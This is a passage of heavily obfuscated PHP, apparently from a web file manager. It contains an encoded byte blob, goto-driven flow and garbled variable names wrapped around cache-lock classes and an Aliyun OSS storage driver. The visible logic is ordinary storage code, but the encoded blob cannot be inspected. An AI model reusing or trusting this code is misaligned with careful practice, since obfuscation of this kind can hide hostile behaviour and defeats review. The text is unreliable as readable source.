363\204\255\50\363\62\64\70\111\53\103\153\131\112\31\352\52\316\374\113\351\270\110\53\143\201\100\353\304\173\264\354\260\247\114\262\154\316\120\336\340\41\132\166"."\xe9\x5b\x4e\x4b\x4\x17\x5c\x1e\x18\x66\x95\x84\x84\x33\xf1\xd6\xb0\x64\xd1\x3b\xd5\x41\xd2\x8b\xf9\xc1\xbc\xc1\xb7\x89\xb4\xb0\x1d\xc3\xa6\xa9\xfc\x75\x5e\xfe\xb9\x92\xda\x9c\xa8\x99"."\57\112\126\245\145\15\214\75\344\275\371\22\241\65\253\62\35\270\144\231\115\245\26\303\326\123\222\65\224\260\111\345\335\324\5\33\237\225\164\155\56\65\227\20\354\35"."\147\345\145\24\101\4\4\354\232\120\47\73\254\335\351\376\17\172\164\172\232\326\204\117\155\371\21\12\26\257\74\164\277\244\311\61\303\264\75\70\55\156\24\310\157\243".strrev(''."\0".'ÑğDq±	SF˜Ğå‡®p‚A²:	ğ¨‘G‚^q!@’2G›ÃÉ„ËŠ™tâÛa')."\xc8\x7b\x1a\x9c\xef\xb5\x14\x5d\x27\x90\x2\x80\x84\xc8\xa4\x31\xca\xbc\xe3\xe1\x5b\xb4\xa2\x3d\xe2\x51\x5f\xd5\xcd\xc8\x9\x1e\x4\xf0\x4d\x36\xf9\x20\x77\x95\x2d\x3f\x4d\xf1\x83\xeb".strrev('HŠØ±:’JÇ‹2¸7\\ì$%º‚¨¤5'."\0".'j«ñÜËéÅú'."\r".'ñŞ©/`')."\264\231\172\40\55\111\46\245\44\23\232\222\244\316\266\110\307\104\151\301\366\100\50\134\222\206\255\155\72\22\302\175\22\115\12\165\222\126\6\302\341\310\212\211\132\21".base64_decode('aloqWkIOTYV2u5AxmNKaaf9japbJ0tIFPC0n/GiJMk4VgTyvFnMxxwNOP/0u6w==')."\x36\x86\xb0\x50\x11\xb6\x94\xe9\x80\xba\xa3\x5\x80\x62\x8f\xac\x7c\x71\x73\x66\x99\x74\x48\xb6\xa2\x13\xc7\xc2\x3e\xc7\xf1\xb1\x4\x27\x8b\x85\x90\x18\x9\x9\xe5\xdd\x95\x0\xaa\xca"."\216\230\254\52\55\125\335\223\124\61\42\270\245\47\30\111\32\31\60\222\222\152\236\312\56\160\53\16\306\130\62\217\242\141\110\376\337\125\263\377\222\170\241\0\0".""."".strrev('').""."".base64_decode(''), 10, -8))); goto Fç”õ©íğÜ; DƒØÀ™¥°ø: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¦‰–ŸÚÇ =& $_SERVER[Á÷ ­Šë]; $Ãëœª³É = $GLOBALS[$¦‰–ŸÚÇ[6]][$¦‰–ŸÚÇ[356]]; self::$cachePath = $Ãëœª³É[$¦‰–ŸÚÇ[203]][$¦‰–ŸÚÇ[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ğğûûï³, $¨ÏÁ…°œ = 0) { $ÍÚß©ƒ± =& $_SERVER[Á÷ ­Šë]; $¨“òï«¬ = microtime(!0); $Å¥ôá¦ò = $¨“òï«¬ + $¨ÏÁ…°œ + 0.0001; $„âæÓø… = rtrim(self::$cachePath, $ÍÚß©ƒ±[8]) . $ÍÚß©ƒ±[861] . md5($Ğğûûï³) . $ÍÚß©ƒ±[858]; if (file_exists($„âæÓø…) && filemtime($„âæÓø…) && filemtime($„âæÓø…) < time() - 10) { @unlink($„âæÓø…); } do { if (file_exists($„âæÓø…)) { cacheLockWait(); continue; } $÷ÇÚ‰åñ = fopen($„âæÓø…, $ÍÚß©ƒ±[862]); if (!$÷ÇÚ‰åñ) { return !1; } $¡ŸöÇÆ = flock($÷ÇÚ‰åñ, LOCK_EX | LOCK_NB); self::$caches[$Ğğûûï³] = array($ÍÚß©ƒ±[863] => $÷ÇÚ‰åñ, $ÍÚß©ƒ±[203] => $„âæÓø…); fwrite($÷ÇÚ‰åñ, $Å¥ôá¦ò); clearstatcache(); if ($÷ÇÚ‰åñ && $¡ŸöÇÆ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Å¥ôá¦ò); $this->unlock($Ğğûûï³); return !1; } public function lockGet($è»ÁÁ) { $®ˆæü™Ù =& $_SERVER[Á÷ ­Šë]; $ÊîÅ“œı = rtrim(self::$cachePath, $®ˆæü™Ù[8]) . $®ˆæü™Ù[861] . md5($è»ÁÁ) . $®ˆæü™Ù[858]; return file_exists($ÊîÅ“œı); } public function unlock($ÆîîßçØ) { $´„¤Â£ã =& $_SERVER[Á÷ ­Šë]; $±È»Ãªİ = self::$caches[$ÆîîßçØ]; if (!$±È»Ãªİ) { return; } @flock($±È»Ãªİ[$´„¤Â£ã[863]], LOCK_UN); @fclose($±È»Ãªİ[$´„¤Â£ã[863]]); @unlink($±È»Ãªİ[$´„¤Â£ã[203]]); unset(self::$caches[$ÆîîßçØ]); } } class CacheLockRedis { public function lock($½‘¡áöè, $öÂ¨ãî = 10) { $şğ¿ÃÛÕ = Cache::init(); $™Œğ·—… = microtime(!0) + $öÂ¨ãî; while (microtime(!0) < $™Œğ·—…) { $ÜèÄØÊ“ = $şğ¿ÃÛÕ->get($½‘¡áöè); if (!$ÜèÄØÊ“) { $­Çğ˜­ä = $şğ¿ÃÛÕ->setLock($½‘¡áöè, $™Œğ·—…, $öÂ¨ãî); if ($­Çğ˜­ä) { return !0; } } else { if ($ÜèÄØÊ“ < microtime(!0)) { $şğ¿ÃÛÕ->set($½‘¡áöè, $™Œğ·—…, $öÂ¨ãî * 2); if ($şğ¿ÃÛÕ->get($½‘¡áöè) === $ÜèÄØÊ“) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Š·ºêŠ) { return Cache::init()->get($Š·ºêŠ); } public function unlock($áá’ÅÃ) { return Cache::init()->remove($áá’ÅÃ); } } class CacheLockMemcached { public function lock($ğÇ‡üóº, $¿ÁÇÒäÇ = 0) { $ƒı™¡­ = Cache::init(); $•¹¸·Ù = microtime(!0) + $¿ÁÇÒäÇ; while (microtime(!0) < $•¹¸·Ù) { $×šæ»“ = $ƒı™¡­->get($ğÇ‡üóº); if (!$×šæ»“ || $×šæ»“ < microtime(!0)) { $¥Ìí¼ğ¾ = $ƒı™¡­->handle->add($ğÇ‡üóº, $•¹¸·Ù, $¿ÁÇÒäÇ); if ($¥Ìí¼ğ¾) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($å®®¡ƒî) { return Cache::init()->get($å®®¡ƒî); } public function unlock($â›şŞêÚ) { return Cache::init()->remove($â›şŞêÚ); } } goto Aö™İÒ§í; a­·óÊ·’ƒ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($’²ğ²œ¨) { parent::__construct(); include_once SDK_DIR . $_SERVER[Á÷ ­Šë][1304]; $this->_init($’²ğ²œ¨); } public function _init($îã×Ùµ) { $Ä»ğƒ¨ =& $_SERVER[Á÷ ­Šë]; foreach ($îã×Ùµ as $¾õÂ¶¬İ => $íÔ¾íúã) { if (isset($this->{$¾õÂ¶¬İ})) { $this->{$¾õÂ¶¬İ} = $íÔ¾íúã; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ä»ğƒ¨[1305] . LNG($Ä»ğƒ¨[1306])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ãˆÉ™°³ =& $_SERVER[Á÷ ­Šë]; $ÄÆ¶‹ı¾ = new OSS\Model\CorsConfig(); $ş¿òÎ¥É = new OSS\Model\CorsRule(); $ş¿òÎ¥É->addAllowedOrigin($ãˆÉ™°³[1307]); $ş¿òÎ¥É->addAllowedMethod($ãˆÉ™°³[1308]); $ş¿òÎ¥É->addAllowedMethod($ãˆÉ™°³[1309]); $ş¿òÎ¥É->addAllowedMethod($ãˆÉ™°³[1310]); $ş¿òÎ¥É->addAllowedMethod($ãˆÉ™°³[1311]); $ş¿òÎ¥É->addAllowedMethod($ãˆÉ™°³[168]); $ş¿òÎ¥É->setMaxAgeSeconds(600); $ş¿òÎ¥É->addExposeHeader($ãˆÉ™°³[1312]); $ş¿òÎ¥É->addAllowedHeader($ãˆÉ™°³[1307]); $ÄÆ¶‹ı¾->addRule($ş¿òÎ¥É); try { $this->client->putBucketCors($this->bucket, $ÄÆ¶‹ı¾); } catch (OSS\Core\OssException $Öîşààş) { return !1; } return !0; } public function getBucketCors() { $Ô’Ôàâ½ =& $_SERVER[Á÷ ­Šë]; $¶ÑÀ‚ÎÛ = null; try { $¶ÑÀ‚ÎÛ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $èŠ÷²¯Ï) { return null; } if (!$¶ÑÀ‚ÎÛ || !($ÙˆŸñû = $¶ÑÀ‚ÎÛ->getRules())) { return null; } $ÛÇà¸úó = $ÙˆŸñû[0]->getAllowedOrigins(); $şÌ®ƒ˜Ó = $ÙˆŸñû[0]->getAllowedMethods(); $ÃôÓ¯¦ = $ÙˆŸñû[0]->getMaxAgeSeconds(); $‘ÅÉº©à = $ÙˆŸñû[0]->getExposeHeaders(); $¸¦Áí³ë = $ÙˆŸñû[0]->getAllowedHeaders(); return array($Ô’Ôàâ½[191] => isset($ÛÇà¸úó[0]) ? $ÛÇà¸úó[0] : $Ô’Ôàâ½[33], $Ô’Ôàâ½[195] => $şÌ®ƒ˜Ó, $Ô’Ôàâ½[1313] => $ÃôÓ¯¦, $Ô’Ôàâ½[1314] => isset($‘ÅÉº©à[0]) ? $‘ÅÉº©à[0] : $Ô’Ôàâ½[33], $Ô’Ôàâ½[193] => isset($¸¦Áí³ë[0]) ? $¸¦Áí³ë[0] : $Ô’Ôàâ½[33]); } public function isBucketCors() { $ù‘ÉõìÏ =& $_SERVER[Á÷ ­Šë]; $­¨ÛÏ“È = $this->getBucketCors(); if (!$­¨ÛÏ“È || !is_array($­¨ÛÏ“È)) { return !1; } if ($­¨ÛÏ“È[$ù‘ÉõìÏ[191]] != $ù‘ÉõìÏ[192] || $­¨ÛÏ“È[$ù‘ÉõìÏ[193]] != $ù‘ÉõìÏ[192]) { return !1; } $ıÙıãİ¾ = array_map($ù‘ÉõìÏ[194], $­¨ÛÏ“È[$ù‘ÉõìÏ[195]]); if (!is_array($ıÙıãİ¾)) { $ıÙıãİ¾ = array(); } $¥á”æá‹ = array($ù‘ÉõìÏ[196], $ù‘ÉõìÏ[197], $ù‘ÉõìÏ[198], $ù‘ÉõìÏ[199], $ù‘ÉõìÏ[200]); $Ğ“Æµ¾À = array_diff($¥á”æá‹, $ıÙıãİ¾); return empty($Ğ“Æµ¾À); } public function mkfile($ÅÜØßà , $ŸÆŠë£Ô = '', $“‰¿â‘Ñ = REPEAT_RENAME) { $Ê÷âé“¿ = $this->setContent($ÅÜØßà , $ŸÆŠë£Ô); if ($Ê÷âé“¿ !== !1) { return $this->getPathOuter($ÅÜØßà ); } return !1; } public function mkdir($¯‚–æ, $ù…Â°¦ = REPEAT_SKIP) { if ($this->_isFolder($¯‚–æ)) { return $this->getPathOuter($¯‚–æ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¯‚–æ)); } catch (OSS\Core\OssException $İ…’ÓÜİ) { return !1; } return $this->getPathOuter($¯‚–æ); } private function fileList($ ìËí¶á, $·®”ë”Ö = '', $á…³„Ÿ = 0) { $ŒÓæğ„¶ =& $_SERVER[Á÷ ­Šë]; $ ìËí¶á = trim($ ìËí¶á, $ŒÓæğ„¶[8]); $¢È–¾‹Ò = empty($ ìËí¶á) && $ ìËí¶á !== $ŒÓæğ„¶[201] ? $ŒÓæğ„¶[33] : $ ìËí¶á . $ŒÓæğ„¶[8]; $ÀˆÓÛ¥ = $ŒÓæğ„¶[33]; $ß˜äù—Ö = 1000; $–ë•š†¶ = $this->listItemCache === !1 ? !1 : !0; $¢û¸Û÷ = $â« Ûá = array(); while (!0) { check_abort(); $´Òİ¹² = array($ŒÓæğ„¶[1315] => $·®”ë”Ö, $ŒÓæğ„¶[1316] => $¢È–¾‹Ò, $ŒÓæğ„¶[1317] => $ß˜äù—Ö, $ŒÓæğ„¶[1318] => $ÀˆÓÛ¥); try { $§§±¬¢¬ = $this->client->listObjects($this->bucket, $´Òİ¹²); } catch (OSS\Core\OssException $ÒšõøÉ) { break; } $ÀˆÓÛ¥ = $§§±¬¢¬->getNextMarker(); $ãÃ¯ØÚº = $§§±¬¢¬->getObjectList(); $ÂÁ¯‡Ú« = $§§±¬¢¬->getPrefixList(); foreach ($ãÃ¯ØÚº as $àÍ×Õß) { if ($àÍ×Õß->getKey() == $¢È–¾‹Ò) { continue; } $×ºÍÁê¬ = $àÍ×Õß->getKey(); $øàú›“˜ = $àÍ×Õß->getSize(); $ê€·´ªß = $àÍ×Õß->getLastModified(); $ÚşäŠ¬· = $á…³„Ÿ ? array($ŒÓæğ„¶[28] => $×ºÍÁê¬, $ŒÓæğ„¶[88] => $øàú›“˜, $ŒÓæğ„¶[207] => strtotime($ê€·´ªß)) : $×ºÍÁê¬; $‡ØÒúÈ¯ = $øàú›“˜ == 0 && substr($×ºÍÁê¬, strlen($×ºÍÁê¬) - 1, 1) == $ŒÓæğ„¶[8] ? !0 : !1; if ($–ë•š†¶) { $this->cacheMethod($ŒÓæğ„¶[209], $×ºÍÁê¬, $‡ØÒúÈ¯); $this->cacheMethod($ŒÓæğ„¶[210], $×ºÍÁê¬, array($ŒÓæğ„¶[88] => $øàú›“˜, $ŒÓæğ„¶[1319] => $øàú›“˜, $ŒÓæğ„¶[94] => strtotime($ê€·´ªß), $ŒÓæğ„¶[1320] => $ê€·´ªß)); } if ($‡ØÒúÈ¯) { $¢û¸Û÷[] = $×ºÍÁê¬; continue; } $â« Ûá[] = $ÚşäŠ¬·; } foreach ($ÂÁ¯‡Ú« as $÷¦˜‰á) { $¢û¸Û÷[] = $÷¦˜‰á->getPrefix(); if ($–ë•š†¶) { $this->cacheMethod($ŒÓæğ„¶[209], $×ºÍÁê¬, !0); } } if ($ÀˆÓÛ¥ === $ŒÓæğ„¶[33]) { break; } } if ($–ë•š†¶) { $this->cacheMethod($ŒÓæğ„¶[209], $ ìËí¶á, !0); } return array($ŒÓæğ„¶[85] => $¢û¸Û÷, $ŒÓæğ„¶[84] => $â« Ûá); } public function copyFile($»Ú±Óî, $æ¶£èª®) { $‹ğŸ­ö = $this->size($»Ú±Óî); if ($‹ğŸ­ö < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $»Ú±Óî, $this->bucket, $this->pathEncode($æ¶£èª®)); } catch (OSS\Core\OssException $ñŠÎ¦À¶) { return !1; } return $this->getPathOuter($æ¶£èª®); } $‰É¤É¸ì = $this->multiCopyObject($»Ú±Óî, $æ¶£èª®, $‹ğŸ­ö); return $‰É¤É¸ì ? $this->getPathOuter($æ¶£èª®) : !1; } private function multiCopyObject($ğôìËî, $Ó™œ¸†, $¢ÍåÛÄ·) { $é•æ‰Ù =& $_SERVER[Á÷ ­Šë]; try { $Æš„…Ã = array(); if ($¬æ®Ü„ = $this->hashMd5($ğôìËî)) { $Æš„…Ã = array(OSS\OssClient::OSS_HEADERS => array($é•æ‰Ù[1321] => $¬æ®Ü„)); } $Ì“ãê»õ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ó™œ¸†), $Æš„…Ã); $Ú×—İ¯ = 1; $ÚÛÛâÒ× = 0; $“İ‰íìß = array(); $º§Øê²¦ = 1024 * 1024 * 10; $¨ÙÛõŸ = $this->client->generateMultiuploadParts($¢ÍåÛÄ·, $º§Øê²¦); foreach ($¨ÙÛõŸ as $òÔÇÜ¤Œ => $îåƒÅ²­) { $Æá¹¥ƒ” = $ÚÛÛâÒ× + (int) $îåƒÅ²­[$é•æ‰Ù[1322]]; $£»¬ê¿ = (int) $îåƒÅ²­[$é•æ‰Ù[344]] + $Æá¹¥ƒ” - 1; $ˆà»ªÑª = array($é•æ‰Ù[1323] => $Æá¹¥ƒ”, $é•æ‰Ù[1324] => $£»¬ê¿); $“İ‰íìß[] = $this->client->uploadPartCopy($this->bucket, $ğôìËî, $this->bucket, $this->pathEncode($Ó™œ¸†), $Ú×—İ¯, $Ì“ãê»õ, $ˆà»ªÑª); $Ú×—İ¯ = $Ú×—İ¯ + 1; } $˜ºŸï‡ = array(); foreach ($“İ‰íìß as $òÔÇÜ¤Œ => $Ù¹²ÃÈ) { $˜ºŸï‡[] = array($é•æ‰Ù[1325] => $òÔÇÜ¤Œ + 1, $é•æ‰Ù[1326] => $Ù¹²ÃÈ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ó™œ¸†), $Ì“ãê»õ, $˜ºŸï‡); } catch (OSS\Core\OssException $¢™¸ƒ«ñ) { return !1; } return !0; } public function moveFile($Š—İ‰ç, $ß«ñÖ–Ê) { if ($this->copyFile($Š—İ‰ç, $ß«ñÖ–Ê)) { $this->remove($Š—İ‰ç); return $this->getPathOuter($ß«ñÖ–Ê); } return !1; } public function delFile($Ü»•éº²) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ü»•éº²)); } catch (OSS\Core\OssException $ğâ±ƒÜÇ) { return !1; } return !0; } public function delFolder($ÃõÜ»ˆ…) { $ªÆ¤ùàÖ =& $_SERVER[Á÷ ­Šë]; if (!$this->exist($ÃõÜ»ˆ…)) { return !0; } $this->listItemCache = !1; $ÌêÓæ‹€ = $this->fileList($ÃõÜ»ˆ…); $this->listItemCache = !0; $¶¼ÓÄ¯œ = trim($ÃõÜ»ˆ…, $ªÆ¤ùàÖ[8]) . $ªÆ¤ùàÖ[8]; if (!empty($ÃõÜ»ˆ…) && $ÃõÜ»ˆ… !== $ªÆ¤ùàÖ[201] && !in_array($¶¼ÓÄ¯œ, $ÌêÓæ‹€[$ªÆ¤ùàÖ[85]])) { $ÌêÓæ‹€[$ªÆ¤ùàÖ[85]][] = $¶¼ÓÄ¯œ; } $çÅè‡†¯ = $this->delByBatch($ÌêÓæ‹€[$ªÆ¤ùàÖ[84]]); if (!$çÅè‡†¯) { return !1; } $çÅè‡†¯ = $this->delByBatch($ÌêÓæ‹€[$ªÆ¤ùàÖ[85]]); if (!$çÅè‡†¯) { return !1; } return $this->delFile($¶¼ÓÄ¯œ); } private function delByBatch($ïşµÈ¼Ê) { foreach (array_chunk($ïşµÈ¼Ê, 1000) as $û±ú°ôı) { try { $this->client->deleteObjects($this->bucket, $û±ú°ôı); } catch (OSS\Core\OssException $¡çÈİ§Ú) { return !1; } } return !0; } public function rename($ÒøÓÅÛ², $ÄìŸ¬ô») { return $this->renameObject($ÒøÓÅÛ², $ÄìŸ¬ô»); } private function fileInfo($¶ı‚úì†, $¦İ®¦ï = false, $Áä»¯É = array()) { $ŠÈ©Ÿ„à =& $_SERVER[Á÷ ­Šë]; $¦ı¿€½ = array($ŠÈ©Ÿ„à[28] => $this->pathThis($¶ı‚úì†), $ŠÈ©Ÿ„à[86] => $this->getPathOuter($¶ı‚úì†), $ŠÈ©Ÿ„à[29] => $ŠÈ©Ÿ„à[203], $ŠÈ©Ÿ„à[88] => isset($Áä»¯É[$ŠÈ©Ÿ„à[88]]) ? $Áä»¯É[$ŠÈ©Ÿ„à[88]] : 0, $ŠÈ©Ÿ„à[178] => $this->ext($¶ı‚úì†)); if ($¦İ®¦ï) { return $¦ı¿€½; } $¦ı¿€½[$ŠÈ©Ÿ„à[204]] = $¦ı¿€½[$ŠÈ©Ÿ„à[94]] = 0; $¦ı¿€½[$ŠÈ©Ÿ„à[205]] = $¦ı¿€½[$ŠÈ©Ÿ„à[206]] = !0; if (empty($Áä»¯É)) { $ĞËÏƒâÍ = $this->objectMeta($¶ı‚úì†); if (!$ĞËÏƒâÍ) { return $¦ı¿€½; } $Áä»¯É = array($ŠÈ©Ÿ„à[94] => strtotime($ĞËÏƒâÍ[$ŠÈ©Ÿ„à[1320]]), $ŠÈ©Ÿ„à[88] => $ĞËÏƒâÍ[$ŠÈ©Ÿ„à[1319]] + 0); } if (isset($Áä»¯É[$ŠÈ©Ÿ„à[88]])) { $¦ı¿€½[$ŠÈ©Ÿ„à[88]] = $Áä»¯É[$ŠÈ©Ÿ„à[88]]; } if (isset($Áä»¯É[$ŠÈ©Ÿ„à[94]])) { $¦ı¿€½[$ŠÈ©Ÿ„à[94]] = $Áä»¯É[$ŠÈ©Ÿ„à[94]]; } if (isset($Áä»¯É[$ŠÈ©Ÿ„à[207]]) && !trim($¦ı¿€½[$ŠÈ©Ÿ„à[94]])) { $¦ı¿€½[$ŠÈ©Ÿ„à[94]] = $Áä»¯É[$ŠÈ©Ÿ„à[207]]; } return $¦ı¿€½; } private function folderInfo($»£§üŠ, $ñüêĞÀü = false, $äÃÍĞù = array()) { $¤Ü•ñ¦è =& $_SERVER[Á÷ ­Šë]; $ÍÑÖò£‰ = array($¤Ü•ñ¦è[28] => $this->pathThis($»£§üŠ), $¤Ü•ñ¦è[86] => $this->getPathOuter($¤Ü•ñ¦è[8] . $»£§üŠ), $¤Ü•ñ¦è[29] => $¤Ü•ñ¦è[87]); if ($ñüêĞÀü) { return $ÍÑÖò£‰; } $ÍÑÖò£‰[$¤Ü•ñ¦è[204]] = $ÍÑÖò£‰[$¤Ü•ñ¦è[94]] = 0; $ÍÑÖò£‰[$¤Ü•ñ¦è[205]] = $ÍÑÖò£‰[$¤Ü•ñ¦è[206]] = !0; if (empty($äÃÍĞù)) { $»£§üŠ = rtrim($»£§üŠ, $¤Ü•ñ¦è[8]) . $¤Ü•ñ¦è[8]; $Ãç–•Ëô = $this->objectMeta($»£§üŠ); if (!$Ãç–•Ëô) { return $ÍÑÖò£‰; } $äÃÍĞù = array($¤Ü•ñ¦è[204] => $Ãç–•Ëô[$¤Ü•ñ¦è[515]][$¤Ü•ñ¦è[1327]], $¤Ü•ñ¦è[94] => strtotime($Ãç–•Ëô[$¤Ü•ñ¦è[1320]])); } if (isset($äÃÍĞù[$¤Ü•ñ¦è[94]])) { $ÍÑÖò£‰[$¤Ü•ñ¦è[94]] = $äÃÍĞù[$¤Ü•ñ¦è[94]]; } if (isset($äÃÍĞù[$¤Ü•ñ¦è[204]])) { $ÍÑÖò£‰[$¤Ü•ñ¦è[204]] = $äÃÍĞù[$¤Ü•ñ¦è[204]]; } return $ÍÑÖò£‰; } public function listPath($ÔÜëŸ†¾, $øš…™Ú = false) { $È‘Û =& $_SERVER[Á÷ ­Šë]; $è‘æÜÙ¡ = $this->fileList($ÔÜëŸ†¾, $È‘Û[8], !0); foreach ($è‘æÜÙ¡[$È‘Û[85]] as $¥¨æ„˜ª => $Í¯ ²ƒ€) { $è‘æÜÙ¡[$È‘Û[85]][$¥¨æ„˜ª] = $this->folderInfo($Í¯ ²ƒ€, $øš…™Ú, $Í¯ ²ƒ€); } foreach ($è‘æÜÙ¡[$È‘Û[84]] as $¥¨æ„˜ª => $Í¯ ²ƒ€) { $è‘æÜÙ¡[$È‘Û[84]][$¥¨æ„˜ª] = $this->fileInfo($Í¯ ²ƒ€[$È‘Û[28]], $øš…™Ú, $Í¯ ²ƒ€); } return $è‘æÜÙ¡; } public function has($äª‡Ò‘, $‰’ ¢×¸ = false, $¾ğèÚ£ä = true) { $Î“ö¤Á˜ =& $_SERVER[Á÷ ­Šë]; $äª‡Ò‘ = trim($äª‡Ò‘, $Î“ö¤Á˜[8]); $Î·å©¡¥ = empty($äª‡Ò‘) && $äª‡Ò‘ !== $Î“ö¤Á˜[201] ? $Î“ö¤Á˜[33] : $äª‡Ò‘ . $Î“ö¤Á˜[8]; $ÉÌœ„Ï• = $Î“ö¤Á˜[33]; $ì²¥‘’½ = 500; $—«ê˜Ùİ = $ƒ°…Ñ’ = 0; while (!0) { check_abort(); $õùßúÉŠ = array($Î“ö¤Á˜[1315] => $Î“ö¤Á˜[8], $Î“ö¤Á˜[1316] => $Î·å©¡¥, $Î“ö¤Á˜[1317] => $ì²¥‘’½, $Î“ö¤Á˜[1318] => $ÉÌœ„Ï•); try { $®…Î±°Û = $this->client->listObjects($this->bucket, $õùßúÉŠ); } catch (OSS\Core\OssException $íóĞÑóï) { break; } $ÉÌœ„Ï• = $®…Î±°Û->getNextMarker(); $ı¼ÛŞ¦Î = $®…Î±°Û->getObjectList(); $íæ¬ã² = $®…Î±°Û->getPrefixList(); if ($‰’ ¢×¸) { if (count($ı¼ÛŞ¦Î) > 1 || count($ı¼ÛŞ¦Î) == 1 && $ı¼ÛŞ¦Î[0]->getKey() != $Î·å©¡¥) { $—«ê˜Ùİ += count($ı¼ÛŞ¦Î) - 1; } if (!empty($íæ¬ã²)) { $ƒ°…Ñ’ += count($íæ¬ã²); } if ($ÉÌœ„Ï• === $Î“ö¤Á˜[33]) { break; } continue; } if ($¾ğèÚ£ä) { if (!empty($ı¼ÛŞ¦Î)) { if (count($ı¼ÛŞ¦Î) > 1 || $ı¼ÛŞ¦Î[0]->getKey() != $Î·å©¡¥) { return !0; } } } else { if (!empty($íæ¬ã²)) { return !0; } } if ($ÉÌœ„Ï• === $Î“ö¤Á˜[33]) { break; } } if ($‰’ ¢×¸) { return array($Î“ö¤Á˜[213] => $—«ê˜Ùİ, $Î“ö¤Á˜[214] => $ƒ°…Ñ’); } return !1; } public function listAll($¥îÅ§ëò) { $ñ¸ËŒÜ =& $_SERVER[Á÷ ­Šë]; $ƒÊ©ì¶° = $this->fileList($¥îÅ§ëò, $ñ¸ËŒÜ[33], !0); $ĞŸõÑ‚Î = array(); foreach ($ƒÊ©ì¶°[$ñ¸ËŒÜ[84]] as $äé·§ªÌ) { $ĞŸõÑ‚Î[$äé·§ªÌ[$ñ¸ËŒÜ[28]]] = $äé·§ªÌ[$ñ¸ËŒÜ[88]]; } foreach ($ƒÊ©ì¶°[$ñ¸ËŒÜ[85]] as $äé·§ªÌ) { if (is_string($äé·§ªÌ)) { $ĞŸõÑ‚Î[$äé·§ªÌ] = 0; } } return $this->listAllFiles($¥îÅ§ëò, array_keys($ĞŸõÑ‚Î), $ĞŸõÑ‚Î); } public function canRead($Ø¹ûû) { $«ùŞïÛ– =& $_SERVER[Á÷ ­Šë]; $¯›şÙÍ— = $this->pathAcl($Ø¹ûû); return $¯›şÙÍ— == $«ùŞïÛ–[1328] || $¯›şÙÍ— == $«ùŞïÛ–[554] ? !0 : !1; } public function canWrite($ØÛ•øëƒ) { $ææ ¼ = $this->pathAcl($ØÛ•øëƒ); return $ææ ¼ == $_SERVER[Á÷ ­Šë][554] ? !0 : !1; } public function pathAcl($¶“ªèû) { $…Ş àœŒ =& $_SERVER[Á÷ ­Šë]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $å©Ùß‰­ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¶“ªèû)); } catch (OSS\Core\OssException $Ó»Ó¯¸Á) { return !1; } $¬Ö·­›ô = $å©Ùß‰­ == $…Ş àœŒ[34] ? $this->bucketAcl : $å©Ùß‰­; if ($¬Ö·­›ô == $…Ş àœŒ[1329]) { return $…Ş àœŒ[1328]; } if ($¬Ö·­›ô == $…Ş àœŒ[1330]) { return $…Ş àœŒ[554]; } return $¬Ö·­›ô; } private function chmodPath($»††ÈåÌ, $™¡–÷øİ = '') { $ÒÉ•Èùô =& $_SERVER[Á÷ ­Šë]; $“ùÔù” = empty($™¡–÷øİ) ? $ÒÉ•Èùô[1330] : $™¡–÷øİ; $ºóÇƒ„× = array($ÒÉ•Èùô[34], $ÒÉ•Èùô[202], $ÒÉ•Èùô[1329], $ÒÉ•Èùô[1330]); if (!in_array($“ùÔù”, $ºóÇƒ„×)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($»††ÈåÌ), $“ùÔù”); } catch (OSS\Core\OssException $¡İ„èÆ›) { return !1; } return !0; } public function getContent($å¢¼¥ˆî) { return $this->fileSubstr($å¢¼¥ˆî, -1); } public function setContent($ˆä¼”‡, $¥ÙäÂĞß = '') { $Ü»Ò­¨Ù =& $_SERVER[Á÷ ­Šë]; try { $Óªš½Ò¬ = $this->trafficLimit($Ü»Ò­¨Ù[1331]); $Òî®ÒŞ = $this->client->putObject($this->bucket, $this->pathEncode($ˆä¼”‡), $¥ÙäÂĞß, $Óªš½Ò¬); } catch (OSS\Core\OssException $ƒ¸ÃâÃ”) { return !1; } $¢çœâÀË = array($Ü»Ò­¨Ù[1321] => trim($Òî®ÒŞ[$Ü»Ò­¨Ù[1332]], $Ü»Ò­¨Ù[126]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ˆä¼”‡))); $this->updateObjMeta($ˆä¼”‡, $¢çœâÀË); return isset($Òî®ÒŞ[$Ü»Ò­¨Ù[1333]][$Ü»Ò­¨Ù[1280]]) ? !0 : !1; } private function updateObjMeta($ÌÃ”Åñ, $Ğ€Ÿ£Ê´) { $ÌÃ”Åñ = $this->pathEncode($ÌÃ”Åñ); try { $ˆï½Ã“í = array(OSS\OssClient::OSS_HEADERS => $Ğ€Ÿ£Ê´); $this->client->copyObject($this->bucket, $ÌÃ”Åñ, $this->bucket, $ÌÃ”Åñ, $ˆï½Ã“í); } catch (OSS\Core\OssException $ŞÑÔø„‚) { return !1; } return !0; } public function upload($¢ëÃÓ‹Ü, $’Ğ¼ß«³, $§ƒÁ›ƒÛ = false, $¥×şàëÏ = REPEAT_REPLACE) { $é ‹µë =& $_SERVER[Á÷ ­Šë]; $“¯Î“â = trim($¢ëÃÓ‹Ü, $é ‹µë[8]); $¶Òà‡ü“ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($é 